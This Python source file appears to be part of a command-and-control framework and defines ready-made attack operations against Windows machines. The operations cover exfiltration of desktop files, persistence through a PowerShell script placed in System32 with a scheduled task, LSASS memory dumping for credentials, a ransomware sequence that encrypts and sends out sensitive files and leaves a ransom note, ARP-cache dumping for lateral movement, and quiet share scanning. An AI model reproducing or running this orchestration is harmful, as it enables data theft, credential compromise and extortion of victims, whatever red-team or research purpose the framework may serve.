from c2.c2_operations import C2Operation
import c2.concrete_actions as c2actions
import c2.specific_operations as specops


def desktop_exfiltration():
    actions = [
        c2actions.find_local_users(),
        c2actions.list_target_local_user_desktop(),
        c2actions.read_staged_files()
    ]
    name = "Desktop exfiltration (Thief)"
    description = "Discover local users, select the first one, collect the list of files " \
                  "on its desktop and exfiltrate them"
    operation = C2Operation(actions, name, description)
    return operation


def persistence_and_credential_access():
    actions = [
        c2actions.write_file("update.ps1", "\\??\\C:\\Windows\\System32\\update.ps1"),
        c2actions.install_schtask(),
        c2actions.get_system_version(),
        c2actions.dump_lsass_process()
    ]
    name = "Persistence and credential access"
    description = "Upload a powershell script and install a scheduled task that executes that " \
                  "script at boot, get system version and dump memory of LSASS process"
    operation = C2Operation(actions, name, description)
    return operation


def ransomware():
    actions = [
        c2actions.find_local_users(),
        c2actions.find_sensitive_files(),
        c2actions.read_and_encrypt_staged_files(),
        c2actions.send_encrypted_files(),
        c2actions.write_ransom_message()
    ]
    name = "Ransomware (discovery, collection, exfiltration, impact)"
    description = "Discover and exfiltrate sensitive files, encrypt them and leave a message"
    operation = C2Operation(actions, name, description)
    return operation


def read_arp_cache():
    actions = [
        c2actions.run_user_mode_arbitrary_command(
            'cmd.exe /c "arp -a > C:\\Windows\\Temp\\laccolith.txt"'
        ),
        c2actions.read_and_parse_arp_cache('\\??\\C:\\Windows\\Temp\\laccolith.txt')
    ]
    name = "Read ARP cache"
    description = "Dump ARP cache entries, preparing for lateral movements on victim's local network"
    operation = C2Operation(actions, name, description)
    return operation


def iterative_directory_listing():
    operation = specops.IterativeDirectoryListing(initial_directory="\\??\\C:\\Users\\admin\\Desktop\\")
    return operation


def scan_local_network_shares():
    operation = specops.QuietScanNeighborShares()
    return operation
